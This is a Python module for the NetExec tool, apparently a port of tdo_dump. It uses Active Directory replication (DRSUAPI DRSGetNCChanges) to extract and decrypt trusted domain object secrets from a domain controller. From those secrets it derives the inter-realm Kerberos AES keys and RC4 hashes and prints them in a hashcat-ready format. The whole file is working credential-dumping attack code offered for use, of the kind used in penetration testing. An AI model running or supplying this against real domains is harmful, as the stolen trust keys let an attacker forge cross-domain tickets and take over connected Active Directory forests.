import contextlib
from struct import unpack
from uuid import UUID

from impacket.dcerpc.v5 import epm, rpcrt, transport, drsuapi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.krb5 import constants
from impacket.krb5.crypto import string_to_key
from impacket.uuid import string_to_bin
from Cryptodome.Hash import MD4

from nxc.helpers.misc import CATEGORY
from nxc.parsers.ldap_results import parse_result_attributes

# Attribute identifiers used to replicate the trusted domain object via DRSUAPI.
ATTRTYP_TO_ATTID = {
    "trustPartner": "1.2.840.113556.1.4.133",
    "trustAuthIncoming": "1.2.840.113556.1.4.129",
    "trustAuthOutgoing": "1.2.840.113556.1.4.135",
}
NAME_TO_ATTRTYP = {
    "trustPartner": 0x90085,
    "trustAuthIncoming": 0x90081,
    "trustAuthOutgoing": 0x90087,
}

KERBEROS_TYPE = {
    1: "des-cbc-crc",
    3: "des-cbc-md5",
    17: "aes128-cts-hmac-sha1-96",
    18: "aes256-cts-hmac-sha1-96",
}


def drs_guid_str(object_guid):
    # parse_result_attributes decodes objectGUID with UUID(bytes=...), i.e. the raw AD bytes
    # read big-endian. DRSUAPI (via impacket string_to_bin) expects the canonical Windows text
    # form, whose little-endian packing equals the on-wire GUID. Re-read the raw bytes as
    # little-endian so string_to_bin(...) reproduces the original objectGUID exactly.
    if isinstance(object_guid, UUID):
        return str(UUID(bytes_le=object_guid.bytes))
    return str(object_guid)


def parse_trust_key_struct(trust_key_struct):
    # [MS-ADTS] 6.1.6.9.1 trustAuthInfo, returns (current_key, previous_key) cleartext
    offset_authentication_info = unpack("<I", trust_key_struct[4:8])[0]
    offset_previous_authentication_info = unpack("<I", trust_key_struct[8:12])[0]
    auth_info = trust_key_struct[offset_authentication_info:offset_previous_authentication_info]
    previous_auth_info = trust_key_struct[offset_previous_authentication_info:]
    auth_info_length = unpack("<I", auth_info[12:16])[0]
    current_key = auth_info[16:16 + auth_info_length]
    previous_auth_info_length = unpack("<I", previous_auth_info[12:16])[0]
    previous_key = previous_auth_info[16:16 + previous_auth_info_length]
    return current_key, previous_key


def compute_kerberos_salt(current_domain, trusted_domain, is_in, is_intertrust):
    # Account key salt uses the NetBIOS (short) partner name, inter-realm key salt uses the FQDN.
    if is_in:
        if not is_intertrust:
            trusted_domain = trusted_domain.split(".")[0]
        from_domain = current_domain
        dest_domain = trusted_domain
    else:
        if not is_intertrust:
            current_domain = current_domain.split(".")[0]
        from_domain = trusted_domain
        dest_domain = current_domain
    return f"{from_domain.upper()}krbtgt{dest_domain.upper()}"


def compute_kerberos_keys(raw_secret, trusted_domain, current_domain, is_in, is_intertrust):
    salt = compute_kerberos_salt(current_domain, trusted_domain, is_in, is_intertrust)
    secret = raw_secret.decode("utf-16-le", "replace").encode("utf-8", "replace")
    out = []
    for etype in (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value)):
        key = string_to_key(etype, secret, salt, None)
        out.append((KERBEROS_TYPE[etype], key.contents.hex()))
    return out


class NXCModule:
    """
    Dump trusted domain object (TDO) secrets and derive the inter-realm Kerberos keys.

    Unlike --ntds (which yields the trust account keys, salted with the partner's short name),
    this reads the cleartext from the TDO via DRSUAPI and re-derives the keys with the inter-realm
    salt (partner FQDN), giving the actual AES keys used for cross-realm referral tickets.

    Port of AlmondOffSec/tdo_dump by ThePirateWhoSmellsOfSunflowers.

    Module by Goultarde
    """

    name = "tdo_dump"
    description = "Dump trusted domain objects and derive the inter-realm Kerberos keys (AES + RC4)"
    supported_protocols = ["ldap"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """
        OUTPUT_FORMAT   Output format: 'secretsdump' (default, one key per line, colon-separated,
                        greppable) or 'pretty' (grouped, human-readable). Default: secretsdump
        """
        fmt = module_options.get("OUTPUT_FORMAT", "secretsdump").lower()
        self.secretsdump = fmt not in ("pretty", "grouped", "detailed")

    def on_login(self, context, connection):
        domain = connection.domain
        base_dn = connection.baseDN

        # 1. DSA GUID of a DC hosting the domain NC (needed as the replication source identity).
        dsa_resp = connection.search(
            f"(&(objectClass=nTDSDSA)(msDS-HasDomainNCs={base_dn}))",
            ["objectGUID"],
            baseDN=f"CN=Configuration,{base_dn}",
        )
        dsa_entries = parse_result_attributes(dsa_resp)
        if not dsa_entries:
            context.log.fail("Could not retrieve the nTDSDSA objectGUID")
            return
        dsa_guid = drs_guid_str(dsa_entries[0]["objectGUID"])
        context.log.debug(f"DSA GUID: {dsa_guid}")

        # 2. All trusted domain objects.
        tdo_resp = connection.search("(objectClass=trustedDomain)", ["objectGUID", "trustPartner", "flatName"])
        tdos = parse_result_attributes(tdo_resp)
        if not tdos:
            context.log.fail("No trustedDomain object found")
            return
        context.log.display(f"Found {len(tdos)} trusted domain object(s)")

        # 3. DRSUAPI connection reusing the current credentials.
        dce, context_handle = self._drs_connect(context, connection)
        if dce is None:
            return

        try:
            for tdo in tdos:
                partner = tdo.get("trustPartner", "unknown")
                tdo_guid = drs_guid_str(tdo["objectGUID"])
                self._dump_one(context, dce, context_handle, dsa_guid, tdo_guid, partner, domain)
        finally:
            with contextlib.suppress(Exception):
                drsuapi.hDRSUnbind(dce, context_handle)

    def _drs_connect(self, context, connection):
        use_kerberos = bool(getattr(connection, "kerberos", False)) or bool(getattr(connection, "use_kcache", False)) or bool(getattr(connection, "aesKey", None))
        host = connection.host
        kdc_host = getattr(connection, "kdcHost", None) or getattr(connection, "hostname", None)
        try:
            binding = epm.hept_map(host, drsuapi.MSRPC_UUID_DRSUAPI, dataRepresentation=rpcrt.DCERPC.NDRSyntax, protocol="ncacn_ip_tcp")
            rpctransport = transport.DCERPCTransportFactory(binding)
            rpctransport.set_credentials(
                connection.username,
                getattr(connection, "password", "") or "",
                connection.domain,
                lmhash=getattr(connection, "lmhash", "") or "",
                nthash=getattr(connection, "nthash", "") or "",
                aesKey=getattr(connection, "aesKey", "") or "",
            )
            if use_kerberos:
                rpctransport.set_kerberos(True, kdcHost=kdc_host)
                if kdc_host:
                    rpctransport.setRemoteName(kdc_host)
                    rpctransport.setRemoteHost(host)
            dce = rpctransport.get_dce_rpc()
            if use_kerberos:
                dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
            dce.connect()
            dce.set_credentials(*rpctransport.get_credentials())
            dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)
            context_handle = self._get_drs_context(dce)
            return dce, context_handle
        except Exception as e:
            context.log.fail(f"DRSUAPI connection failed: {e}")
            return None, None

    def _get_drs_context(self, dce):
        dw_flag = 0xffffffff - drsuapi.DRS_EXT_RESERVED_FOR_WIN2K_OR_DOTNET_PART2 - drsuapi.DRS_EXT_RESERVED_FOR_WIN2K_OR_DOTNET_PART3
        request = drsuapi.DRSBind()
        request["puuidClientDsa"] = drsuapi.NTDSAPI_CLIENT_GUID
        drs = drsuapi.DRS_EXTENSIONS_INT()
        drs["cb"] = len(drs)
        drs["dwFlags"] = dw_flag
        drs["SiteObjGuid"] = drsuapi.NULLGUID
        drs["Pid"] = 0
        drs["dwReplEpoch"] = 0
        drs["dwFlagsExt"] = drsuapi.DRS_EXT_RECYCLE_BIN | drsuapi.DRS_EXT_LH_BETA2
        drs["ConfigObjGUID"] = drsuapi.NULLGUID
        drs["dwExtCaps"] = drsuapi.DRS_EXT_RECYCLE_BIN | drsuapi.DRS_EXT_LH_BETA2
        request["pextClient"]["cb"] = len(drs)
        request["pextClient"]["rgb"] = list(drs.getData())
        return dce.request(request)["phDrs"]

    def _drs_get_tdo(self, dce, context_handle, dsa_guid, tdo_guid):
        request = drsuapi.DRSGetNCChanges()
        request["hDrs"] = context_handle
        request["dwInVersion"] = 8
        request["pmsgIn"]["tag"] = 8
        request["pmsgIn"]["V8"]["uuidDsaObjDest"] = string_to_bin(dsa_guid)
        request["pmsgIn"]["V8"]["uuidInvocIdSrc"] = string_to_bin(dsa_guid)

        ds_name = drsuapi.DSNAME()
        ds_name["SidLen"] = 0
        ds_name["Guid"] = string_to_bin(tdo_guid)
        ds_name["Sid"] = ""
        ds_name["NameLen"] = 0
        ds_name["StringName"] = "\x00"
        ds_name["structLen"] = len(ds_name.getData())
        request["pmsgIn"]["V8"]["pNC"] = ds_name

        request["pmsgIn"]["V8"]["usnvecFrom"]["usnHighObjUpdate"] = 0
        request["pmsgIn"]["V8"]["usnvecFrom"]["usnHighPropUpdate"] = 0
        request["pmsgIn"]["V8"]["pUpToDateVecDest"] = NULL
        request["pmsgIn"]["V8"]["ulFlags"] = drsuapi.DRS_WRIT_REP | drsuapi.DRS_INIT_SYNC
        request["pmsgIn"]["V8"]["cMaxObjects"] = 2
        request["pmsgIn"]["V8"]["cMaxBytes"] = 0
        request["pmsgIn"]["V8"]["ulExtendedOp"] = drsuapi.EXOP_REPL_OBJ

        prefix_table = []
        ppartial = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
        ppartial["dwVersion"] = 1
        ppartial["cAttrs"] = len(ATTRTYP_TO_ATTID)
        for att_id in ATTRTYP_TO_ATTID.values():
            ppartial["rgPartialAttr"].append(drsuapi.MakeAttid(prefix_table, att_id))
        request["pmsgIn"]["V8"]["pPartialAttrSet"] = ppartial
        request["pmsgIn"]["V8"]["PrefixTableDest"]["PrefixCount"] = len(prefix_table)
        request["pmsgIn"]["V8"]["PrefixTableDest"]["pPrefixEntry"] = prefix_table
        request["pmsgIn"]["V8"]["pPartialAttrSetEx1"] = NULL
        return dce.request(request)

    def _dump_one(self, context, dce, context_handle, dsa_guid, tdo_guid, partner, domain):
        try:
            record = self._drs_get_tdo(dce, context_handle, dsa_guid, tdo_guid)
        except Exception as e:
            context.log.fail(f"DRSGetNCChanges failed for {partner}: {e}")
            return

        reply = f"V{record['pdwOutVersion']}"
        if record["pmsgOut"][reply]["cNumObjects"] == 0:
            context.log.fail(f"No object replicated for {partner}")
            return

        prefix_table = record["pmsgOut"][reply]["PrefixTableSrc"]["pPrefixEntry"]
        incoming_key = outgoing_key = None
        for attr in record["pmsgOut"][reply]["pObjects"]["Entinf"]["AttrBlock"]["pAttr"]:
            try:
                att_id = drsuapi.OidFromAttid(prefix_table, attr["attrTyp"])
                lookup = ATTRTYP_TO_ATTID
            except Exception:
                att_id = attr["attrTyp"]
                lookup = NAME_TO_ATTRTYP

            if att_id == lookup["trustAuthIncoming"] and attr["AttrVal"]["valCount"] > 0:
                try:
                    enc = b"".join(attr["AttrVal"]["pAVal"][0]["pVal"])
                    incoming_key = parse_trust_key_struct(drsuapi.DecryptAttributeValue(dce, enc))[0]
                except Exception:
                    incoming_key = None
            elif att_id == lookup["trustAuthOutgoing"] and attr["AttrVal"]["valCount"] > 0:
                try:
                    enc = b"".join(attr["AttrVal"]["pAVal"][0]["pVal"])
                    outgoing_key = parse_trust_key_struct(drsuapi.DecryptAttributeValue(dce, enc))[0]
                except Exception:
                    outgoing_key = None

        directions = [
            (raw, "Incoming" if is_in else "Outgoing", is_in)
            for raw, is_in in ((incoming_key, True), (outgoing_key, False))
            if raw
        ]
        if not directions:
            return

        # One header per TDO, then a sub-header per direction, indented like other modules.
        # directions is already filtered to present keys, so a missing direction simply does not
        # print and a single direction renders without any dangling structure.
        if not self.secretsdump:
            context.log.display(f"{partner} -> {domain.upper()}")

        for raw_secret, direction, is_in in directions:
            nt_hash = MD4.new(raw_secret).hexdigest()
            keys = compute_kerberos_keys(raw_secret, partner, domain, is_in, True)

            if self.secretsdump:
                # One key per line, colon-separated: greppable / hashcat-ready.
                context.log.highlight(f"{partner} ({direction}):rc4_hmac:{nt_hash}")
                for typename, key_hex in keys:
                    context.log.highlight(f"{partner} ({direction}):{typename}:{key_hex}")
            else:
                context.log.highlight(f"     {direction}")
                context.log.highlight(f"       {'rc4_hmac (NT)':<14} {nt_hash}")
                for typename, key_hex in keys:
                    context.log.highlight(f"       {typename.split('-')[0]:<14} {key_hex}")
